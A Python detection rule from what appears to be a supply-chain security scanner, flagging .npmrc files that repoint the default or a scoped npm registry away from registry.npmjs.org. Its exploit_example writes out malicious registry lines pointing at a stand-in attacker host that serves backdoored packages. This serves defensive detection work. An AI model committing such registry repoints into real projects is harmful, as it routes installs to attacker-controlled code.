"""NPM-020, ``.npmrc`` repoints the default / scoped registry off npmjs."""
from __future__ import annotations

from urllib.parse import urlparse

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import NpmRc

RULE = Rule(
    id="NPM-020",
    title=".npmrc repoints the default or a scoped registry to a non-canonical host",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-3",),
    esf=("ESF-S-TRUSTED-REG", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-829", "CWE-494"),
    recommendation=(
        "Point ``registry=`` (and any ``@scope:registry=``) at canonical "
        "npm (``https://registry.npmjs.org/``) or a vetted internal "
        "mirror that proxies it. ``registry=`` replaces the default "
        "index outright, so every package, direct and transitive, is "
        "fetched from that host; a ``@scope:registry=`` line silently "
        "routes one scope elsewhere. An attacker who lands a committed "
        "``.npmrc`` repoint serves backdoored tarballs under the real "
        "names. If the host is a legitimate internal registry, suppress "
        "with a one-line rationale that names it."
    ),
    docs_note=(
        "Fires when a ``.npmrc`` sets ``registry=`` or "
        "``@scope:registry=`` to a host other than ``registry.npmjs.org`` "
        "(``registry.yarnpkg.com`` is also accepted as canonical), or to "
        "a plaintext ``http://`` registry of any host. The default-"
        "registry repoint is the substitutive dependency-confusion "
        "vector (the npm config-layer analog of PYPI-016 / COMPOSER-012 / "
        "CARGO-012); a scoped repoint is how an internal ``@company`` "
        "scope gets hijacked to a public / attacker host. NPM-007 reads "
        "the same ``.npmrc`` but only the ``ignore-scripts`` key; NPM-003 "
        "treats any HTTPS registry host as safe, so neither sees this. "
        "Leans on suppression for legitimate internal mirrors."
    ),
    known_fp=(
        "Many organizations set ``registry=`` to an internal proxy "
        "(Artifactory / Verdaccio / GitHub Packages) that mirrors npm, "
        "and route a private ``@scope`` to it. That is a legitimate, "
        "recommended setup; the rule can't tell a vetted internal mirror "
        "from an attacker host. Suppress with ``--ignore-file`` and a "
        "one-line note naming the registry once you've confirmed it.",
    ),
    exploit_example=(
        "# Vulnerable: a committed .npmrc repoints resolution off npmjs.\n"
        "# Every install (and a private scope) now resolves from the\n"
        "# attacker host, which serves backdoored tarballs under the\n"
        "# real package names. No package.json line changes.\n"
        "registry=https://registry.attacker.test/\n"
        "@acme:registry=https://registry.attacker.test/\n"
        "\n"
        "# Safe: canonical npm (or a vetted internal mirror, suppressed\n"
        "# with a rationale).\n"
        "registry=https://registry.npmjs.org/"
    ),
)

# Hosts treated as the canonical public registry. A value pointing here
# (over HTTPS) is the safe baseline.
_CANONICAL_HOSTS: frozenset[str] = frozenset({
    "registry.npmjs.org", "registry.yarnpkg.com",
})


def _registry_keys(settings: dict[str, str]) -> list[tuple[str, str]]:
    """Return ``(key, value)`` for the default and every scoped registry."""
    out: list[tuple[str, str]] = []
    for key, value in settings.items():
        if key == "registry" or key.endswith(":registry"):
            if isinstance(value, str) and value.strip():
                out.append((key, value.strip()))
    return out


def check(rc: NpmRc) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    for key, value in _registry_keys(rc.settings):
        parsed = urlparse(value if "//" in value else f"//{value}")
        host = (parsed.hostname or "").lower()
        scheme = parsed.scheme.lower()
        canonical = host in _CANONICAL_HOSTS
        insecure = scheme == "http"
        if canonical and not insecure:
            continue
        if insecure:
            reason = f"plaintext http:// registry ({host or value})"
        else:
            reason = f"non-canonical host {host or value}"
        offenders.append(f"{key}={value} ({reason})")
        line_no = 1
        for idx, line in enumerate(rc.text.splitlines(), start=1):
            if line.strip().lower().startswith(key):
                line_no = idx
                break
        locations.append(Location(
            path=rc.path, start_line=line_no, end_line=line_no,
        ))
    passed = not offenders
    desc = (
        ".npmrc resolves packages from canonical npm (or HTTPS)."
        if passed else
        f"{len(offenders)} registry line(s) repoint resolution off "
        f"canonical npm: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. Every (or every scoped) "
        f"install is fetched from that host; confirm it is a vetted "
        f"mirror, not an attacker repoint."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=rc.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
